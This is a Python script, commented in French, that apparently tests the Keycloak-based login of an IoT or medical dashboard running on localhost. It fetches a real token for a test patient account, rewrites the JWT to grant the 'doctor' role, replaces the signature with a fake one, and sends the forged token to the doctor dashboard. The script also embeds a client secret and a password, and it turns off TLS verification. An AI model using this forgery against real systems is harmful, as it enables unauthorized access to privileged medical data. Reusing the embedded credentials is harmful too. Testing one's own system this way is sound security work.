import requests
import json
import base64

# --- Config ---
CLIENT_ID = "iot_backend"
CLIENT_SECRET = "q1nMXKR6EKwafhEcDkeugyvgmbhGpbSp"
USERNAME = "patient_011"
PASSWORD = "test123"
KEYCLOAK_TOKEN_URL = "http://localhost:8080/realms/iot_realm/protocol/openid-connect/token"
TARGET_URL = "https://localhost:8000/dashboard/doctor"

# --- Encodage/Décodage Base64URL ---
def b64url_decode(data):
    rem = len(data) % 4
    if rem > 0:
        data += "=" * (4 - rem)
    return base64.urlsafe_b64decode(data.encode())

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

# --- Obtenir le token réel ---
def get_real_token():
    data = {
        "grant_type": "password",
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "username": USERNAME,
        "password": PASSWORD
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    resp = requests.post(KEYCLOAK_TOKEN_URL, data=data, headers=headers, verify=False)
    return resp.json()["access_token"]

# --- Modifier le payload pour injecter un rôle doctor ---
def forge_token(original_token):
    parts = original_token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    print("🧩 Rôles initiaux :", payload.get("realm_access"))

    # 🔥 Privilege Escalation
    payload["realm_access"] = {"roles": ["doctor"]}

    print("🚨 Rôles modifiés :", payload["realm_access"])

    new_header = b64url_encode(json.dumps(header).encode())
    new_payload = b64url_encode(json.dumps(payload).encode())
    fake_signature = "forgedsignature"

    return f"{new_header}.{new_payload}.{fake_signature}"

# --- Envoi du token modifié ---
def test_token(forged_token):
    headers = {"Authorization": f"Bearer {forged_token}"}
    resp = requests.get(TARGET_URL, headers=headers, verify=False)
    print(f"✅ Code retour : {resp.status_code}")
    print(resp.text[:1000])

# --- Main ---
if __name__ == "__main__":
    real_token = get_real_token()
    print("🔓 Token original obtenu.")
    forged = forge_token(real_token)
    print("🔐 Token falsifié :", forged)
    test_token(forged)
